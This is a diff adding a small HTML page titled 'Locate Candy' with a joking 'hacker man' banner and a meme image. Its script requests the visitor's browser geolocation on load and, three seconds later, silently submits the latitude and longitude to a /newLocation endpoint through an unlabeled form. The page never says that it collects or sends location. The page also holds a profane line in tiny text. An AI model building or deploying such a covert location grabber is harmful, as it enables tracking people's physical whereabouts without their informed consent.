@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Locate Candy</title>
+    <style>
+      * {
+        font-family: Impact, Haettenschweiler, "Arial Narrow Bold", sans-serif;
+        color: white;
+      }
+      body {
+        background-color: rgb(41, 39, 42);
+      }
+    </style>
+  </head>
+  <body>
+    <div
+      style="
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+      "
+    >
+      <h1>
+        Welcome to the best website where you can be hacker man, mister Robot or
+        even gary mckinnon ( you know the guy who hacked nasa and stuff !)
+      </h1>
+      <img
+        src="https://i.kym-cdn.com/photos/images/newsfeed/001/176/251/4d7.png"
+        alt="HackerMan"
+        style="border-radius: 500px;"
+      />
+      <form action="/newLocation" method="POST" id="fr_lo">
+        <input type="text" name="lat" id="latF" /><input
+          type="text"
+          name="long"
+          id="longF"
+        />
+      </form>
+
+      <p style="font-size: 5px;">FUCK RIOT GAMES</p>
+    </div>
+    <script>
+      const forMM = document.getElementById("fr_lo");
+      const latF = document.getElementById("latF");
+      const longF = document.getElementById("longF");
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          console.log(pos.coords);
+          setTimeout(() => {
+            latF.value = pos.coords.latitude;
+            longF.value = pos.coords.longitude;
+            forMM.submit();
+          }, 3000);
+        },
+        (err) => {
+          console.log(err);
+        },
+        { timeout: 3000, maximumAge: 0 }
+      );
+    </script>
+  </body>
+</html>
